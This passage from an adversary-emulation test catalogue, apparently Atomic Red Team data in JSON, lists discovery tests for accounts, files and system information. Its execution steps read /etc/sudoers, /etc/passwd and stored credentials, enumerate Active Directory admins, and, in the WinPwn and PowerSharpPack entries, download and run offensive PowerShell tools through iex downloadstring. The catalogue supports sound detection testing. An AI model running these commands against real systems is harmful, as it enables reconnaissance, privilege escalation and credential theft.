lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties\n", "successCriteria": null}], "techniqueIds": ["clacwm5uq02tq29mq5b6f6w8b", "clacwm1p800ak29mqhswkfe7k"], "tags": []}, {"data": {"name": "Adfind - Enumerate Active Directory User Objects", "shortName": "T1087.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory User Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | adfind_path | Path to the AdFind executable | Path | PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe | "}, "executionSteps": [{"description": "#{adfind_path} -f (objectcategory=person)\n", "successCriteria": null}], "techniqueIds": ["clacwm5uq02tq29mq5b6f6w8b", "clacwm1p800ak29mqhswkfe7k"], "tags": []}, {"data": {"name": "Adfind - Enumerate Active Directory Exchange AD Objects", "shortName": "T1087.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Exchange Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | adfind_path | Path to the AdFind executable | Path | PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe | "}, "executionSteps": [{"description": "#{adfind_path} -sc exchaddresses\n", "successCriteria": null}], "techniqueIds": ["clacwm5uq02tq29mq5b6f6w8b", "clacwm1p800ak29mqhswkfe7k"], "tags": []}, {"data": {"name": "Adfind - Enumerate Active Directory Admins", "shortName": "T1087.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Admin accounts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://stealthbits.com/blog/fun-with-active-directorys-admincount-attribute/\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | adfind_path | Path to the AdFind executable | Path | PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe | "}, "executionSteps": [{"description": "#{adfind_path} -sc admincountdmp\n", "successCriteria": null}], "techniqueIds": ["clacwm5uq02tq29mq5b6f6w8b", "clacwm1p800ak29mqhswkfe7k"], "tags": []}, {"data": {"name": "View sudoers access", "shortName": "T1087.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "(requires root)\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path where captured results will be placed | Path | /tmp/T1087.001.txt | "}, "executionSteps": [{"description": "sudo cat /etc/sudoers > #{output_file}\ncat #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm5va02ue29mq4qm57ib8", "clacwm22400iy29mqd6oy7zs7"], "tags": []}, {"data": {"name": "View accounts with UID 0", "shortName": "T1087.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "View accounts with UID 0\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path where captured results will be placed | Path | /tmp/T1087.001.txt | "}, "executionSteps": [{"description": "grep 'x:0:' /etc/passwd > #{output_file}\ncat #{output_file} 2>/dev/null\n", "successCriteria": null}], "techniqueIds": ["clacwm5va02ue29mq4qm57ib8", "clacwm22400iy29mqd6oy7zs7"], "tags": []}, {"data": {"name": "Show if a user account has ever logged in remotely", "shortName": "T1087.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Show if a user account has ever logged in remotely\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path where captured results will be placed | Path | /tmp/T1087.001.txt | "}, "executionSteps": [{"description": "lastlog > #{output_file}\ncat #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm5va02ue29mq4qm57ib8", "clacwm22400iy29mqd6oy7zs7"], "tags": []}, {"data": {"name": "List opened files by user", "shortName": "T1087.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "List opened files by user\n\n\n**Supported Platforms:** linux, macos\n\n"}, "executionSteps": [{"description": "username=$(id -u -n) && lsof -u $username\n", "successCriteria": null}], "techniqueIds": ["clacwm5va02ue29mq4qm57ib8", "clacwm22400iy29mqd6oy7zs7"], "tags": []}, {"data": {"name": "Enumerate users and groups", "shortName": "T1087.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilize groups and id to enumerate users and groups\n\n\n**Supported Platforms:** linux, macos\n\n"}, "executionSteps": [{"description": "groups\nid\n", "successCriteria": null}], "techniqueIds": ["clacwm22400iy29mqd6oy7zs7"], "tags": []}, {"data": {"name": "Enumerate users and groups", "shortName": "T1087.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilize local utilities to enumerate users and groups\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "dscl . list /Groups\ndscl . list /Users\ndscl . list /Users | grep -v '_'\ndscacheutil -q group\ndscacheutil -q user\n", "successCriteria": null}], "techniqueIds": ["clacwm5va02ue29mq4qm57ib8", "clacwm22400iy29mqd6oy7zs7"], "tags": []}, {"data": {"name": "Enumerate logged on users via PowerShell", "shortName": "T1087.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Enumerate logged on users via PowerShell. Upon exeuction, logged on users will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "query user\n", "successCriteria": null}], "techniqueIds": ["clacwm22400iy29mqd6oy7zs7"], "tags": []}, {"data": {"name": "Enumerate logged on users via CMD (Local)", "shortName": "T1087.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Enumerate logged on users. Upon execution, logged on users will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "query user\n", "successCriteria": null}], "techniqueIds": ["clacwm5va02ue29mq4qm57ib8", "clacwm22400iy29mqd6oy7zs7"], "tags": []}, {"data": {"name": "Enumerate all accounts via PowerShell (Local)", "shortName": "T1087.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "net user\nget-localuser\nget-localgroupmember -group Users\ncmdkey.exe /list\nls C:/Users\nget-childitem C:\\Users\\\ndir C:\\Users\\\nget-localgroup\nnet localgroup\n", "successCriteria": null}], "techniqueIds": ["clacwm5va02ue29mq4qm57ib8", "clacwm22400iy29mqd6oy7zs7"], "tags": []}, {"data": {"name": "Enumerate all accounts on Windows (Local)", "shortName": "T1087.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Enumerate all accounts\nUpon execution, multiple enumeration commands will be run and their output displayed in the PowerShell session\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "net user\ndir c:\\Users\\\ncmdkey.exe /list\nnet localgroup \"Users\"\nnet localgroup\n", "successCriteria": null}], "techniqueIds": ["clacwm5va02ue29mq4qm57ib8", "clacwm22400iy29mqd6oy7zs7"], "tags": []}, {"data": {"name": "Enumerate all accounts (Local)", "shortName": "T1087.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Enumerate all accounts by copying /etc/passwd to another file\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path where captured results will be placed | Path | /tmp/T1087.001.txt | "}, "executionSteps": [{"description": "cat /etc/passwd > #{output_file}\ncat #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm5va02ue29mq4qm57ib8", "clacwm22400iy29mqd6oy7zs7"], "tags": []}, {"data": {"name": "Simulating MAZE Directory Enumeration", "shortName": "T1083", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test emulates MAZE ransomware's ability to enumerate directories using Powershell. \nUpon successful execution, this test will output the directory enumeration results to a specified file, as well as display them in the active window. \nSee https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | File_to_output | File to output results to | String | $env:temp\\T1083Test5.txt | "}, "executionSteps": [{"description": "$folderarray = @(\"Desktop\", \"Downloads\", \"Documents\", \"AppData/Local\", \"AppData/Roaming\")\nGet-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}\nGet-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append #{File_to_output}\nGet-ChildItem -Path \"${env:ProgramFiles(x86)}\" -erroraction silentlycontinue | Out-File -append #{File_to_output}\n$UsersFolder = \"$env:homedrive\\Users\\\"\nforeach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) \n{\nforeach ($secondarydirectory in $folderarray)\n {Get-ChildItem -Path \"$UsersFolder/$directory/$secondarydirectory\" -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}}\n}\ncat #{File_to_output}\n", "successCriteria": null}], "techniqueIds": ["clacwm6b403a229mq3gvc1ioq"], "tags": []}, {"data": {"name": "Nix File and Directory Discovery 2", "shortName": "T1083", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Find or discover files on the file system\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Output file used to store the results. | Path | /tmp/T1083.txt | "}, "executionSteps": [{"description": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > #{output_file}\nif [ -f /etc/mtab ]; then cat /etc/mtab >> #{output_file}; fi;\nfind . -type f -iname *.pdf >> #{output_file}\ncat #{output_file}\nfind . -type f -name \".*\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6b403a229mq3gvc1ioq", "clacwm1vt00er29mq88ue4akl"], "tags": []}, {"data": {"name": "Nix File and Directory Discovery", "shortName": "T1083", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Find or discover files on the file system\n\nReferences:\n\nhttp://osxdaily.com/2013/01/29/list-all-files-subdirectory-contents-recursively/\n\nhttps://perishablepress.com/list-files-folders-recursively-terminal/\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Output file used to store the results. | Path | /tmp/T1083.txt | "}, "executionSteps": [{"description": "ls -a >> #{output_file}\nif [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > #{output_file}; fi;\nfile */* *>> #{output_file}\ncat #{output_file} 2>/dev/null\nfind . -type f\nls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'\nlocate *\nwhich sh\n", "successCriteria": null}], "techniqueIds": ["clacwm6b403a229mq3gvc1ioq"], "tags": []}, {"data": {"name": "Nix File and Diectory Discovery", "shortName": "T1083", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Find or discover files on the file system\n\nReferences:\n\nhttp://osxdaily.com/2013/01/29/list-all-files-subdirectory-contents-recursively/\n\nhttps://perishablepress.com/list-files-folders-recursively-terminal/\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Output file used to store the results. | path | /tmp/T1083.txt | "}, "executionSteps": [{"description": "ls -a >> #{output_file}\nif [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > #{output_file}; fi;\nfile */* *>> #{output_file}\ncat #{output_file} 2>/dev/null\nfind . -type f\nls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'\nlocate *\nwhich sh\n", "successCriteria": null}], "techniqueIds": ["clacwm1vt00er29mq88ue4akl"], "tags": []}, {"data": {"name": "Launch DirLister Executable", "shortName": "T1083", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Launches the DirLister executable for a short period of time and then exits.\n\nRecently seen used by [BlackCat ransomware](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/) to create a list of accessible directories and files.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | dirlister_path | Path to the DirLister executable  | String | PathToAtomicsFolder\\T1083\\bin\\DirLister.exe | "}, "executionSteps": [{"description": "Start-Process #{dirlister_path}\nStart-Sleep -Second 4\nStop-Process -Name \"DirLister\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6b403a229mq3gvc1ioq"], "tags": []}, {"data": {"name": "File and Directory Discovery (PowerShell)", "shortName": "T1083", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Find or discover files on the file system. Upon execution, file and folder information will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "ls -recurse\nget-childitem -recurse\ngci -recurse\n", "successCriteria": null}], "techniqueIds": ["clacwm6b403a229mq3gvc1ioq", "clacwm1vt00er29mq88ue4akl"], "tags": []}, {"data": {"name": "File and Directory Discovery (cmd.exe)", "shortName": "T1083", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Find or discover files on the file system.  Upon successful execution, this test will output the results of all the data discovery commands to a specified file.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | File to output results to | String | %temp%\\T1083Test1.txt | "}, "executionSteps": [{"description": "dir /s c:\\ >> #{output_file}\ndir /s \"c:\\Documents and Settings\" >> #{output_file}\ndir /s \"c:\\Program Files\\\" >> #{output_file}\ndir \"%systemdrive%\\Users\\*.*\" >> #{output_file}\ndir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> #{output_file}\ndir \"%userprofile%\\Desktop\\*.*\" >> #{output_file}\ntree /F >> #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6b403a229mq3gvc1ioq", "clacwm1vt00er29mq88ue4akl"], "tags": []}, {"data": {"name": "WinPwn - winPEAS", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwinPEAS -noninteractive -consoleoutput", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4"], "tags": []}, {"data": {"name": "WinPwn - RBCD-Check", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nRBCD-Check -consoleoutput -noninteractive", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4"], "tags": []}, {"data": {"name": "WinPwn - Powersploits privesc checks", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Powersploits privesc checks using oldchecks function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\noldchecks -noninteractive -consoleoutput", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4"], "tags": []}, {"data": {"name": "WinPwn - PowerSharpPack - Watson searching for missing windows patches", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')\nInvoke-watson", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4"], "tags": []}, {"data": {"name": "WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')\nInvoke-SharpUp -command \"audit\"", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4"], "tags": []}, {"data": {"name": "WinPwn - PowerSharpPack - Seatbelt", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "PowerSharpPack - Seatbelt technique via function of WinPwn.\n\n[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives.\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')\nInvoke-Seatbelt -Command \"-group=all\"; pause", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4"], "tags": []}, {"data": {"name": "WinPwn - Morerecon", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Gathers local system information using the Morerecon function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nMorerecon -noninteractive -consoleoutput", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4"], "tags": []}, {"data": {"name": "WinPwn - itm4nprivesc", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nitm4nprivesc -noninteractive -consoleoutput", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4"], "tags": []}, {"data": {"name": "WinPwn - GeneralRecon", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Collect general computer informations via GeneralRecon function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGeneralrecon -consoleoutput -noninteractive", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4"], "tags": []}, {"data": {"name": "WinPwn - General privesc checks", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "General privesc checks using the otherchecks function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\notherchecks -noninteractive -consoleoutput", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4"], "tags": []}, {"data": {"name": "Windows MachineGUID Discovery", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid\n", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4", "clacwm2hy00w429mq639y4grf"], "tags": []}, {"data": {"name": "System Information Discovery", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify System Info. Upon execution, system info and time info will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "systeminfo\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n", "successCriteria": null}], "techniqueIds": ["clacwm2hy00w429mq639y4grf"], "tags": []}, {"data": {"name": "System Information Discovery", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify System Info\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "system_profiler\nls -al /Applications\n", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4", "clacwm2hy00w429mq639y4grf"], "tags": []}, {"data": {"name": "Show System Integrity Protection status (MacOS)", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Read and Display System Intergrety Protection status. csrutil is commonly used by malware and post-exploitation tools to determine whether certain files and directories on the system are writable or not.\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "csrutil status\n", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4"], "tags": []}, {"data": {"name": "List OS Information", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify System Info\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Output file used to store the results. | Path | /tmp/T1082.txt | "}, "executionSteps": [{"description": "uname -a >> #{output_file}\nif [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi\nif [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi   \nif [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi\nuptime >> #{output_file}\ncat #{output_file} 2>/dev/null\n", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4", "clacwm2hy00w429mq639y4grf"], "tags": []}, {"data": {"name": "Linux VM Check via Kernel Modules", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify virtual machine guest kernel modules. This technique is used by the Pupy RAT and other malware.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "sudo lsmod | grep -i \"vboxsf\\|vboxguest\"\nsudo lsmod | grep -i \"vmw_baloon\\|vmxnet\"\nsudo lsmod | grep -i \"xen-vbd\\|xen-vnif\"\nsudo lsmod | grep -i \"virtio_pci\\|virtio_net\"\nsudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4", "clacwm2hy00w429mq639y4grf"], "tags": []}, {"data": {"name": "Linux VM Check via Hardware", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify virtual machine hardware. This technique is used by the Pupy RAT and other malware.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"; fi\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"; fi\nif [ -x \"$(command -v dmidecode)\" ]; then sudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"; fi\nif [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"; fi\nif [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"; fi\nif [ -x \"$(command -v lspci)\" ]; then sudo lspci | grep -i \"vmware\\|virtualbox\"; fi\nif [ -x \"$(command -v lscpu)\" ]; then sudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"; fi\n", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4", "clacwm2hy00w429mq639y4grf"], "tags": []}, {"data": {"name": "Linux List Kernel Modules", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify kernel modules installed. Upon successful execution stdout will display kernel modules installed on host.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "sudo lsmod\nsudo kmod list\n", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4"], "tags": []}, {"data": {"name": "Hostname Discovery (Windows)", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "hostname\n", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4", "clacwm2hy00w429mq639y4grf"], "tags": []}, {"data": {"name": "Hostname Discovery", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify system hostname for Linux and macOS systems.\n\n\n**Supported Platforms:** linux, macos\n\n"}, "executionSteps": [{"description": "hostname\n", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4", "clacwm2hy00w429mq639y4grf"], "tags": []}, {"data": {"name": "Griffon Recon", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This script emulates the reconnaissance script seen in used by Griffon and was modified by security researcher Kirk Sayre \nin order simply print the recon results to the screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).  \nFor more information see also [https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | vbscript | Path to sample script | String | PathToAtomicsFolder\\T1082\\src\\griffon_recon.vbs | "}, "executionSteps": [{"description": "cscript #{vbscript}", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4", "clacwm2hy00w429mq639y4grf"], "tags": []}, {"data": {"name": "Environment variables discovery on windows", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "set\n", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4"], "tags": []}, {"data": {"name": "Environment variables discovery on macos and linux", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n\n\n**Supported Platforms:** macos, linux\n\n"}, "executionSteps": [{"description": "env\n", "successCriteria": null}], "techniqueIds": ["clacwm5yv02xk29mqcx2f1aj4"], "tags": []}, {"data": {"name": "Environment variables discovery", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "set\n", "successCriteria": null}], "techniqueIds": ["clacwm2hy00w429mq639y4grf"], "tags": []}, {"data": {"name": "Azure Security Scan with SkyArk", "shortName": "T1082", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Upon successful execution, this test will utilize a valid read-only Azure AD user's credentials to conduct a security scan and determine what users exist in a given tenant, as well as identify any admin users. \nOnce the test is complete, a folder will be output to the temp directory that contains 3 csv files which provide info on the discovered users. \nSee 